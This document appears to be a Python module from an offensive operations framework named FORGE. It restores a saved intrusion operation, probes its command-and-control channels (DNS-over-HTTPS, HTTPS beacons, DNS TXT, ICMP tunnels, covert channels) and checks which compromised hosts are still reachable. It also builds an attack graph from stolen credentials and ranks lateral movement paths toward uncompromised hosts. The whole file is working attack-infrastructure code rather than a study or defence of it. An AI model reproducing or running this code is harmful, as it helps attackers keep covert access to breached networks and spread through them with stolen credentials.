"""
Session Restore Engine — Resume operations from persistent state.

On resume:
1. Load operation from DB
2. Verify all C2 channels (ping each, mark failed)
3. Verify all persistent hosts (beacon check, mark lost)
4. Rebuild attack graph in memory (directed graph)
5. Recalculate optimal lateral movement paths
6. Resume autonomous loop from last known good state
7. Print delta report
"""
import asyncio
import hashlib
import json
import os
import socket
import ssl
import struct
import subprocess
import time
from collections import defaultdict
from typing import Any, Dict, List, Optional, Set, Tuple

from o1o_o.core.operations_db import OperationsDB


# ─── Lightweight Directed Graph (no NetworkX dependency) ──────────

class AttackGraph:
    """In-memory directed graph for attack surface modeling."""

    def __init__(self):
        self.nodes: Dict[str, dict] = {}   # node_id → {type, data}
        self.edges: List[Tuple[str, str, dict]] = []  # (src, dst, metadata)
        self._adj: Dict[str, List[Tuple[str, dict]]] = defaultdict(list)
        self._rev: Dict[str, List[Tuple[str, dict]]] = defaultdict(list)

    def add_node(self, node_id: str, node_type: str = 'host', **data):
        self.nodes[node_id] = {'type': node_type, **data}

    def add_edge(self, src: str, dst: str, **metadata):
        edge = (src, dst, metadata)
        self.edges.append(edge)
        self._adj[src].append((dst, metadata))
        self._rev[dst].append((src, metadata))

    def neighbors(self, node_id: str) -> List[Tuple[str, dict]]:
        return self._adj.get(node_id, [])

    def predecessors(self, node_id: str) -> List[Tuple[str, dict]]:
        return self._rev.get(node_id, [])

    def get_hosts_with_service(self, service: str) -> List[str]:
        """Find all host nodes that have a specific service."""
        results = []
        for nid, data in self.nodes.items():
            if data.get('type') != 'host':
                continue
            services = data.get('services', [])
            if service in services:
                results.append(nid)
        return results

    def shortest_path(self, src: str, dst: str) -> Optional[List[str]]:
        """BFS shortest path between two nodes."""
        if src not in self.nodes or dst not in self.nodes:
            return None
        if src == dst:
            return [src]

        visited = {src}
        queue = [(src, [src])]

        while queue:
            current, path = queue.pop(0)
            for neighbor, _ in self._adj.get(current, []):
                if neighbor == dst:
                    return path + [neighbor]
                if neighbor not in visited:
                    visited.add(neighbor)
                    queue.append((neighbor, path + [neighbor]))

        return None  # no path exists

    def find_paths_to_objective(self, objective_type: str) -> List[List[str]]:
        """Find all paths from compromised hosts to objective-type nodes."""
        # Get all compromised/persistent hosts as start nodes
        starts = [nid for nid, d in self.nodes.items()
                  if d.get('type') == 'host' and d.get('status') in ('compromised', 'persistent')]
        # Get objective nodes
        objectives = [nid for nid, d in self.nodes.items()
                      if d.get('type') == objective_type or d.get('objective') == objective_type]

        paths = []
        for start in starts:
            for obj in objectives:
                path = self.shortest_path(start, obj)
                if path:
                    paths.append(path)

        return sorted(paths, key=len)  # shortest first

    def get_pivot_candidates(self, from_host: str) -> List[dict]:
        """Get hosts reachable from a compromised host for lateral movement."""
        candidates = []
        for neighbor_id, edge_data in self._adj.get(from_host, []):
            node = self.nodes.get(neighbor_id, {})
            if node.get('type') == 'host' and node.get('status') not in ('burned',):
                candidates.append({
                    'host_id': neighbor_id,
                    'ip': node.get('ip'),
                    'status': node.get('status'),
                    'method': edge_data.get('method', 'unknown'),
                    'confidence': edge_data.get('confidence', 0.5),
                })
        return sorted(candidates, key=lambda x: x['confidence'], reverse=True)

    def to_dict(self) -> dict:
        return {
            'nodes': self.nodes,
            'edges': [(s, d, m) for s, d, m in self.edges],
        }

    def stats(self) -> dict:
        host_count = sum(1 for d in self.nodes.values() if d.get('type') == 'host')
        compromised = sum(1 for d in self.nodes.values()
                         if d.get('type') == 'host' and d.get('status') in ('compromised', 'persistent'))
        return {
            'total_nodes': len(self.nodes),
            'total_edges': len(self.edges),
            'hosts': host_count,
            'compromised': compromised,
            'services': len([d for d in self.nodes.values() if d.get('type') == 'service']),
        }


# ─── C2 Channel Verifier ─────────────────────────────────────────

class C2Verifier:
    """Verify C2 channel health by attempting lightweight probes."""

    @staticmethod
    async def verify_channel(channel: dict, timeout: float = 10.0) -> dict:
        """
        Probe a C2 channel. Returns {status, latency_ms, error}.
        Does NOT send actual C2 traffic — just verifies connectivity.
        """
        ch_type = channel.get('channel_type', '')
        endpoint = channel.get('endpoint', '')
        result = {'channel_id': channel['channel_id'], 'status': 'failed',
                  'latency_ms': 0, 'error': None}

        start = time.time()
        try:
            if ch_type == 'dns_over_https':
                result = await C2Verifier._verify_doh(endpoint, timeout)
            elif ch_type == 'https_beacon':
                result = await C2Verifier._verify_https(endpoint, timeout)
            elif ch_type == 'websocket':
                result = await C2Verifier._verify_tcp(endpoint, timeout)
            elif ch_type == 'dns_txt':
                result = await C2Verifier._verify_dns(endpoint, timeout)
            elif ch_type == 'icmp_tunnel':
                result = await C2Verifier._verify_icmp(endpoint, timeout)
            elif ch_type in ('email_covert', 'steganography', 'blockchain'):
                # Async channels — can't verify immediately, mark as degraded
                result = {'status': 'degraded', 'latency_ms': 0,
                          'error': f'{ch_type}: async channel, no realtime verification'}
            else:
                result = {'status': 'degraded', 'latency_ms': 0,
                          'error': f'Unknown channel type: {ch_type}'}

            result['channel_id'] = channel['channel_id']
            result['latency_ms'] = round((time.time() - start) * 1000, 1)

        except Exception as e:
            result = {'channel_id': channel['channel_id'], 'status': 'failed',
                      'latency_ms': round((time.time() - start) * 1000, 1),
                      'error': str(e)}

        return result

    @staticmethod
    async def _verify_doh(endpoint: str, timeout: float) -> dict:
        """Verify DoH endpoint by sending a lightweight DNS query."""
        # Parse URL
        import urllib.request
        import urllib.error
        # Construct minimal DNS query for '.' (root, always works)
        dns_query = bytes.fromhex('0000010000010000000000000000020001')  # minimal A query for .
        import base64
        dns_b64 = base64.urlsafe_b64encode(dns_query).rstrip(b'=').decode()
        url = f"{endpoint}?dns={dns_b64}"

        req = urllib.request.Request(url, headers={
            'Accept': 'application/dns-message',
        })

        loop = asyncio.get_event_loop()
        try:
            resp = await asyncio.wait_for(
                loop.run_in_executor(None, lambda: urllib.request.urlopen(req, timeout=timeout)),
                timeout=timeout + 1
            )
            if resp.status == 200:
                return {'status': 'active', 'error': None}
            return {'status': 'degraded', 'error': f'HTTP {resp.status}'}
        except Exception as e:
            return {'status': 'failed', 'error': str(e)}

    @staticmethod
    async def _verify_https(endpoint: str, timeout: float) -> dict:
        """Verify HTTPS endpoint with TLS handshake."""
        try:
            from urllib.parse import urlparse
            parsed = urlparse(endpoint)
            host = parsed.hostname or endpoint
            port = parsed.port or 443

            loop = asyncio.get_event_loop()

            def _check():
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = socket.create_connection((host, port), timeout=timeout)
                ssock = ctx.wrap_socket(sock, server_hostname=host)
                ssock.close()
                return True

            await asyncio.wait_for(
                loop.run_in_executor(None, _check),
                timeout=timeout + 1
            )
            return {'status': 'active', 'error': None}
        except Exception as e:
            return {'status': 'failed', 'error': str(e)}

    @staticmethod
    async def _verify_tcp(endpoint: str, timeout: float) -> dict:
        """Verify TCP connectivity."""
        try:
            from urllib.parse import urlparse
            parsed = urlparse(endpoint)
            host = parsed.hostname or endpoint
            port = parsed.port or 443

            loop = asyncio.get_event_loop()

            def _check():
                sock = socket.create_connection((host, port), timeout=timeout)
                sock.close()
                return True

            await asyncio.wait_for(
                loop.run_in_executor(None, _check),
                timeout=timeout + 1
            )
            return {'status': 'active', 'error': None}
        except Exception as e:
            return {'status': 'failed', 'error': str(e)}

    @staticmethod
    async def _verify_dns(endpoint: str, timeout: float) -> dict:
        """Verify DNS channel by resolving the C2 domain."""
        try:
            loop = asyncio.get_event_loop()
            await asyncio.wait_for(
                loop.run_in_executor(None, lambda: socket.getaddrinfo(endpoint, None)),
                timeout=timeout
            )
            return {'status': 'active', 'error': None}
        except Exception as e:
            return {'status': 'failed', 'error': str(e)}

    @staticmethod
    async def _verify_icmp(endpoint: str, timeout: float) -> dict:
        """Verify ICMP channel with a ping."""
        try:
            loop = asyncio.get_event_loop()

            def _ping():
                result = subprocess.run(
                    ['ping', '-c', '1', '-W', str(int(timeout)), endpoint],
                    capture_output=True, timeout=timeout + 2
                )
                return result.returncode == 0

            ok = await asyncio.wait_for(
                loop.run_in_executor(None, _ping),
                timeout=timeout + 3
            )
            return {'status': 'active' if ok else 'failed',
                    'error': None if ok else 'ICMP unreachable'}
        except Exception as e:
            return {'status': 'failed', 'error': str(e)}


# ─── Host Verifier ────────────────────────────────────────────────

class HostVerifier:
    """Verify host accessibility via lightweight probes."""

    @staticmethod
    async def verify_host(host: dict, timeout: float = 5.0) -> dict:
        """Check if a host is still reachable."""
        ip = host.get('ip', '')
        result = {'host_id': host.get('host_id'), 'reachable': False,
                  'methods_checked': [], 'latency_ms': 0}

        start = time.time()
        loop = asyncio.get_event_loop()

        # Try TCP connect on common ports
        for port in (22, 445, 135, 3389, 80, 443):
            try:
                def _try_connect(p=port):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(timeout)
                    try:
                        s.connect((ip, p))
                        s.close()
                        return True
                    except (socket.timeout, ConnectionRefusedError, OSError):
                        return False
                    finally:
                        try:
                            s.close()
                        except Exception:
                            pass

                ok = await asyncio.wait_for(
                    loop.run_in_executor(None, _try_connect),
                    timeout=timeout + 1
                )
                result['methods_checked'].append({'port': port, 'reachable': ok})
                if ok:
                    result['reachable'] = True
                    result['latency_ms'] = round((time.time() - start) * 1000, 1)
                    return result
            except Exception:
                result['methods_checked'].append({'port': port, 'reachable': False})

        result['latency_ms'] = round((time.time() - start) * 1000, 1)
        return result


# ─── Session Restore Engine ───────────────────────────────────────

class SessionRestoreEngine:
    """Resume a FORGE operation from persistent state."""

    def __init__(self, ops_db: OperationsDB):
        self.db = ops_db
        self.attack_graph = AttackGraph()
        self.delta = {
            'hosts_verified': 0,
            'hosts_lost': 0,
            'hosts_recovered': 0,
            'c2_verified': 0,
            'c2_failed': 0,
            'payloads_clean': 0,
            'payloads_burned': 0,
            'events_since_last': 0,
        }

    async def restore(self, op_id: str, verify_live: bool = True) -> dict:
        """
        Full session restore sequence.
        Returns dict with attack_graph, delta report, and operation state.
        """
        # Step 1: Load operation
        op = self.db.get_operation(op_id)
        if not op:
            return {'error': f'Operation {op_id} not found'}
        if op['status'] == 'burned':
            return {'error': f'Operation {op_id} is burned — cannot resume'}

        # Step 2: Rebuild attack graph from DB
        self._rebuild_graph(op_id)

        # Step 3: Verify C2 channels (if live verification requested)
        if verify_live:
            await self._verify_c2_channels(op_id)

        # Step 4: Verify persistent hosts (if live verification requested)
        if verify_live:
            await self._verify_hosts(op_id)

        # Step 5: Recalculate lateral movement paths
        paths = self._recalculate_paths()

        # Step 6: Count events since last heartbeat
        last_hb = op.get('last_heartbeat', 0)
        events = self.db.get_events(op_id, limit=1000)
        self.delta['events_since_last'] = sum(
            1 for e in events if e.get('timestamp', 0) > last_hb
        )

        # Step 7: Update heartbeat
        self.db.heartbeat(op_id)
        if op['status'] == 'paused':
            self.db.update_operation_status(op_id, 'active')

        return {
            'op_id': op_id,
            'status': 'restored',
            'attack_graph': self.attack_graph.stats(),
            'lateral_paths': len(paths),
            'delta': self.delta,
        }

    def _rebuild_graph(self, op_id: str):
        """Rebuild attack graph from database state."""
        hosts = self.db.get_hosts(op_id)
        credentials = self.db.get_credentials(op_id)

        # Add host nodes
        for host in hosts:
            services = []
            # Infer services from persistence layers and C2 channels
            if host.get('persistence_layers'):
                layers = host['persistence_layers']
                if isinstance(layers, str):
                    try:
                        layers = json.loads(layers)
                    except (json.JSONDecodeError, TypeError):
                        layers = []
                for layer in (layers if isinstance(layers, list) else []):
                    if isinstance(layer, dict) and layer.get('type'):
                        services.append(layer['type'])

            self.attack_graph.add_node(
                host['host_id'],
                node_type='host',
                ip=host.get('ip'),
                hostname=host.get('hostname'),
                status=host.get('status'),
                os=host.get('os_fingerprint'),
                services=services,
            )

        # Add edges based on credentials (credential links two hosts)
        cred_by_host = defaultdict(list)
        for cred in credentials:
            if cred.get('source_host_id'):
                cred_by_host[cred['source_host_id']].append(cred)

        # If a credential from host A was tested successfully on host B → edge A→B
        for cred in credentials:
            tested = cred.get('tested_against')
            if isinstance(tested, str):
                try:
                    tested = json.loads(tested)
                except (json.JSONDecodeError, TypeError):
                    tested = []
            if not tested or not isinstance(tested, list):
                continue
            src = cred.get('source_host_id')
            if not src:
                continue
            for test in tested:
                if isinstance(test, dict) and test.get('result') == 'success':
                    dst = test.get('host_id')
                    if dst and dst != src:
                        self.attack_graph.add_edge(
                            src, dst,
                            method=cred.get('cred_type', 'unknown'),
                            credential_id=cred.get('cred_id'),
                            confidence=0.9,
                        )

        # Add edges for hosts on the same subnet (potential lateral movement)
        host_ips = [(h['host_id'], h.get('ip', '')) for h in hosts]
        for i, (id_a, ip_a) in enumerate(host_ips):
            for id_b, ip_b in host_ips[i+1:]:
                if ip_a and ip_b and self._same_subnet(ip_a, ip_b):
                    self.attack_graph.add_edge(id_a, id_b, method='subnet',
                                               confidence=0.3)
                    self.attack_graph.add_edge(id_b, id_a, method='subnet',
                                               confidence=0.3)

    @staticmethod
    def _same_subnet(ip_a: str, ip_b: str, mask: int = 24) -> bool:
        """Check if two IPs are on the same /mask subnet."""
        try:
            a = struct.unpack('!I', socket.inet_aton(ip_a))[0]
            b = struct.unpack('!I', socket.inet_aton(ip_b))[0]
            m = (0xffffffff << (32 - mask)) & 0xffffffff
            return (a & m) == (b & m)
        except (OSError, struct.error):
            return False

    async def _verify_c2_channels(self, op_id: str):
        """Verify all C2 channels in parallel."""
        channels = self.db.get_c2_channels(op_id, active_only=False)
        if not channels:
            return

        tasks = [C2Verifier.verify_channel(ch, timeout=10.0) for ch in channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, Exception):
                continue
            ch_id = result.get('channel_id')
            status = result.get('status', 'failed')

            if status == 'active':
                self.delta['c2_verified'] += 1
                self.db.update_c2_status(ch_id, 'active')
            elif status == 'degraded':
                self.delta['c2_verified'] += 1
                self.db.update_c2_status(ch_id, 'degraded')
            else:
                self.delta['c2_failed'] += 1
                self.db.update_c2_status(ch_id, 'failed')
                self.db.log_event(op_id, 'c2_channel_failed', 'warning',
                                  details={'channel_id': ch_id,
                                           'error': result.get('error')})

    async def _verify_hosts(self, op_id: str):
        """Verify all persistent/compromised hosts in parallel."""
        hosts = self.db.get_hosts(op_id)
        active_hosts = [h for h in hosts
                        if h.get('status') in ('compromised', 'persistent')]
        if not active_hosts:
            return

        tasks = [HostVerifier.verify_host(h, timeout=5.0) for h in active_hosts]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, Exception):
                continue
            host_id = result.get('host_id')
            if not host_id:
                continue

            if result.get('reachable'):
                self.delta['hosts_verified'] += 1
            else:
                self.delta['hosts_lost'] += 1
                self.db.update_host_status(host_id, 'lost')
                self.db.log_event(op_id, 'host_lost', 'warning',
                                  source_host_id=host_id,
                                  details={'methods_checked': result.get('methods_checked')})

    def _recalculate_paths(self) -> List[List[str]]:
        """Recalculate all lateral movement paths."""
        # Find all compromised/persistent nodes
        active = [nid for nid, d in self.attack_graph.nodes.items()
                  if d.get('status') in ('compromised', 'persistent')]

        # Find all not-yet-compromised nodes
        targets = [nid for nid, d in self.attack_graph.nodes.items()
                   if d.get('type') == 'host' and d.get('status') in ('discovered', 'credentials_found')]

        paths = []
        for start in active:
            for target in targets:
                path = self.attack_graph.shortest_path(start, target)
                if path and len(path) > 1:
                    paths.append(path)

        return sorted(paths, key=len)

    def format_delta_report(self, op_id: str) -> str:
        """Format restore delta report for terminal display."""
        d = self.delta
        lines = [
            f"\n{'='*60}",
            f"  SESSION RESTORE REPORT — {op_id}",
            f"{'='*60}",
            f"",
            f"  C2 Channels:",
            f"    Verified active:  {d['c2_verified']}",
            f"    Failed:           {d['c2_failed']}",
            f"",
            f"  Hosts:",
            f"    Still reachable:  {d['hosts_verified']}",
            f"    Lost contact:     {d['hosts_lost']}",
            f"    Auto-recovered:   {d['hosts_recovered']}",
            f"",
            f"  Attack Graph:",
        ]

        stats = self.attack_graph.stats()
        lines.extend([
            f"    Nodes: {stats['total_nodes']}  |  Edges: {stats['total_edges']}",
            f"    Hosts: {stats['hosts']}  |  Compromised: {stats['compromised']}",
            f"",
            f"  Events since last session: {d['events_since_last']}",
            f"{'='*60}",
        ])

        return '\n'.join(lines)


# ─── CLI Integration ──────────────────────────────────────────────

def resume_operation(op_id: str, db_path: str = None,
                     passphrase: str = None, verify: bool = True) -> dict:
    """
    Resume a FORGE operation. Called by forge_live.py --resume.
    Returns dict with restore results.
    """
    db = OperationsDB(db_path, passphrase)
    db.connect()

    engine = SessionRestoreEngine(db)
    result = asyncio.run(engine.restore(op_id, verify_live=verify))

    if 'error' not in result:
        report = engine.format_delta_report(op_id)
        result['report'] = report
        result['attack_graph_obj'] = engine.attack_graph

    db.close()
    return result


def get_operation_status(op_id: str = None, db_path: str = None,
                         passphrase: str = None) -> str:
    """
    Get operation status. Called by forge_live.py --status.
    If op_id is None, lists all operations.
    """
    db = OperationsDB(db_path, passphrase)
    db.connect()

    if op_id:
        result = db.format_status(op_id)
    else:
        ops = db.list_operations()
        if not ops:
            result = "No operations found."
        else:
            lines = [f"\n{'='*60}", "  FORGE OPERATIONS", f"{'='*60}", ""]
            for op in ops:
                ts = time.strftime('%Y-%m-%d %H:%M', time.localtime(op.get('created_at', 0)))
                lines.append(f"  [{op['status']:10s}] {op['op_id']}  {op.get('name', '')}  ({ts})")
            lines.append(f"{'='*60}")
            result = '\n'.join(lines)

    db.close()
    return result
